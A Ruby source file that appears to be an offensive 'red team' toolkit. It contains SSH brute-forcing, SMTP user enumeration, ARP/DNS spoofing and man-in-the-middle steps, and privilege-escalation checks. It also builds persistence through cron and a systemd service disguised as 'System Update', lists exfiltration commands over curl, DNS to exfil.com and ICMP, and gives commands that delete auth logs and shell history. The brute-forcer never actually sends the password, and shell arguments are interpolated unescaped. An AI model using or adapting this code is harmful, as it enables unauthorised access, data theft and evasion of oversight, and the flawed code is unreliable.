#!/usr/bin/env ruby
# aura-os/ruby-tools/lib/red_team_tools.rb

require 'socket'
require 'timeout'
require 'json'

module AuraTools
  class RedTeamTools
    class CredentialTester
      def self.http_basic_auth(target, username, password)
        require 'net/http'

        uri = URI(target)
        req = Net::HTTP::Get.new(uri)
        req.basic_auth(username, password)

        begin
          res = Net::HTTP.start(uri.hostname, uri.port, use_ssl: uri.scheme == 'https') do |http|
            http.request(req)
          end

          {
            target: target,
            username: username,
            status: res.code.to_i,
            success: res.code.to_i < 400
          }
        rescue => e
          { error: e.message }
        end
      end

      def self.ssh_bruteforce(host, usernames, passwords, timeout: 5)
        results = []

        usernames.each do |user|
          passwords.each do |pass|
            begin
              `timeout #{timeout} ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o PasswordAuthentication=yes -q #{user}@#{host} "echo success" 2>/dev/null`

              if $?.success?
                results << { user: user, password: pass, success: true }
              end
            rescue
            end
          end
        end

        results
      end

      def self.smtp_enumeration(host, port = 25)
        users = []

        begin
          socket = Socket.tcp(host, port, connect_timeout: 5)
          banner = socket.gets

          common_users = ["admin", "root", "user", "test", "mail", "postmaster"]

          common_users.each do |user|
            socket.puts "VRFY #{user}"
            response = socket.gets

            if response && response.include?("250")
              users << user
            end
          end

          socket.close
          { host: host, users: users }
        rescue => e
          { error: e.message }
        end
      end
    end

    class NetworkAttacks
      def self.arp_spoof(target_ip, spoof_ip)
        puts "[!] ARP spoofing requires root and libnet"
        puts "[*] Command: arpspoof -i eth0 -t #{target_ip} #{spoof_ip}"
      end

      def self.dns_spoof(domain)
        puts "[!] DNS spoofing requires root and DNS server control"
        puts "[*] Add to /etc/hosts:"
        puts "127.0.0.1 #{domain}"
      end

      def self.man_in_the_middle(interface)
        puts "[!] MITM attack setup:"
        puts "1. Enable IP forwarding: sysctl -w net.ipv4.ip_forward=1"
        puts "2. ARP spoof target"
        puts "3. Sniff traffic: tcpdump -i #{interface}"
      end
    end

    class PrivilegeEscalation
      def self.sudo_check
        begin
          output = `sudo -l 2>/dev/null`

          {
            can_run_as_root: output.include?("(ALL)"),
            commands: output.split("\n").select { |l| l.include?("NOPASSWD") || l.include?("bin") }
          }
        rescue
          { error: "No sudo access" }
        end
      end

      def self.suid_binaries
        binaries = []

        begin
          output = `find / -perm -4000 -type f 2>/dev/null`
          binaries = output.split("\n")
        rescue
        end

        {
          suid_binaries: binaries,
          potential_exploits: binaries.select { |b|
            b.include?("cp") || b.include?("chmod") || b.include?("chown")
          }
        }
      end

      def self.kernel_exploits
        uname = `uname -r`.strip

        {
          kernel_version: uname,
          check: "Use: linux-exploit-suggester.sh #{uname}"
        }
      end
    end

    class PostExploitation
      def self.persistence_cron(command)
        cron_entry = "* * * * * #{command}"

        puts "[*] Add to crontab -e:"
        puts cron_entry

        {
          method: "cron",
          entry: cron_entry
        }
      end

      def self.persistence_systemd(name, command)
        service = <<~SERVICE
          [Unit]
          Description=System Update
          After=network.target

          [Service]
          Type=simple
          ExecStart=#{command}
          Restart=always

          [Install]
          WantedBy=multi-user.target
        SERVICE

        puts "[*] Create /etc/systemd/system/#{name}.service:"
        puts service

        {
          method: "systemd",
          service: service
        }
      end

      def self.data_exfiltration(file, destination)
        methods = [
          "# HTTP: curl -X POST -d @#{file} #{destination}",
          "# DNS: cat #{file} | xxd -p -c 16 | while read hex; do nslookup $hex.exfil.com; done",
          "# ICMP: cat #{file} | xxd -p | while read hex; do ping -p $hex -c 1 #{destination}; done"
        ]

        {
          file: file,
          methods: methods
        }
      end

      def self.log_cleanup
        commands = [
          "rm -f /var/log/auth.log",
          "rm -f /var/log/apache2/access.log",
          "rm -f ~/.bash_history",
          "history -c"
        ]

        puts "[!] Log cleanup commands (use with caution):"
        commands.each { |cmd| puts "  #{cmd}" }

        commands
      end
    end
  end
end
